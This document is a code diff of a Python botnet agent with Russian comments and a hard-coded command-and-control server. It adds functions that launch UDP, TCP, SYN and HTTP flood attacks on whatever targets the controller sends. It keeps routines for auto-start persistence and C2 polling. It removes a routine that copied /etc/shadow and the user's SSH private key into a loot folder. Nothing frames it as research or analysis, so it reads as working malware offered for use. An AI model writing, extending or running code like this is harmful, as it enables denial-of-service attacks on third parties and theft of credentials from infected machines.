@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Agent v26.10 – измерение скорости, автозагрузка, XOR
-import socket, json, time, os, platform, subprocess, threading, random, base64, glob, shutil
+# AVZ-Aristo Agent v27.0 – L4 атаки (UDP, TCP, SYN)
+import socket, json, time, os, platform, subprocess, threading, random
 
 C2_HOST = "80.249.146.202"
 C2_PORT = 80
@@ -15,27 +15,12 @@ def xor_decrypt(data, key):
     return xor_encrypt(data, key)
 
 def get_info():
-    info = {
+    return {
         "hostname": platform.node(),
         "os": f"{platform.system()} {platform.release()}",
         "cpu": f"{os.cpu_count()} cores" if hasattr(os, 'cpu_count') else "unknown",
         "ram": "unknown"
     }
-    # Измерение скорости канала
-    try:
-        import requests
-        start = time.time()
-        r = requests.get("http://speedtest.tele2.net/10MB.zip", stream=True, timeout=5)
-        downloaded = 0
-        for chunk in r.iter_content(chunk_size=8192):
-            downloaded += len(chunk)
-            if time.time() - start > 3:
-                break
-        speed_mbps = (downloaded * 8) / ((time.time() - start) * 1_000_000)
-        info["speed_mbps"] = round(speed_mbps, 2)
-    except:
-        info["speed_mbps"] = 0
-    return info
 
 def auto_start():
     try:
@@ -62,12 +47,54 @@ def register():
     except:
         pass
 
-def grab_data():
-    loot_dir = "loot"
-    os.makedirs(loot_dir, exist_ok=True)
-    for f in ["/etc/shadow", os.path.expanduser("~/.ssh/id_rsa")]:
-        if os.path.exists(f):
-            shutil.copy(f, loot_dir)
+def execute_attack(cmd):
+    target = cmd.get("target")
+    method = cmd.get("method", "GET")
+    threads = int(cmd.get("threads", 10))
+    port = int(cmd.get("port", 80))
+    if method == "UDP":
+        def udp_flood():
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            msg = b'\x00' * 1024
+            for _ in range(threads):
+                try:
+                    s.sendto(msg, (target, port))
+                except:
+                    pass
+        threading.Thread(target=udp_flood, daemon=True).start()
+    elif method == "TCP":
+        def tcp_flood():
+            for _ in range(threads):
+                try:
+                    s = socket.socket()
+                    s.connect((target, port))
+                    s.send(b'\x00' * 1024)
+                    s.close()
+                except:
+                    pass
+        threading.Thread(target=tcp_flood, daemon=True).start()
+    elif method == "SYN":
+        try:
+            from scapy.all import IP, TCP, send
+            def syn_flood():
+                for _ in range(threads):
+                    pkt = IP(dst=target) / TCP(dport=port, flags='S')
+                    send(pkt, verbose=False)
+            threading.Thread(target=syn_flood, daemon=True).start()
+        except ImportError:
+            pass
+    else:  # GET/POST
+        import requests
+        def http_flood():
+            for _ in range(threads):
+                try:
+                    if method == "POST":
+                        requests.post(target, data=b'data', timeout=2)
+                    else:
+                        requests.get(target, timeout=2)
+                except:
+                    pass
+        threading.Thread(target=http_flood, daemon=True).start()
 
 def send_ping():
     try:
@@ -85,21 +112,11 @@ def send_ping():
 def main():
     auto_start()
     register()
-    grab_data()
     while True:
         cmds = send_ping()
         for cmd in cmds:
             if cmd.get("type") == "attack":
-                target = cmd.get("target")
-                threads = int(cmd.get("threads", 10))
-                def flood():
-                    import requests
-                    for _ in range(threads):
-                        try:
-                            requests.get(target, timeout=2)
-                        except:
-                            pass
-                threading.Thread(target=flood, daemon=True).start()
+                execute_attack(cmd)
         time.sleep(15)
 
 if __name__ == "__main__":
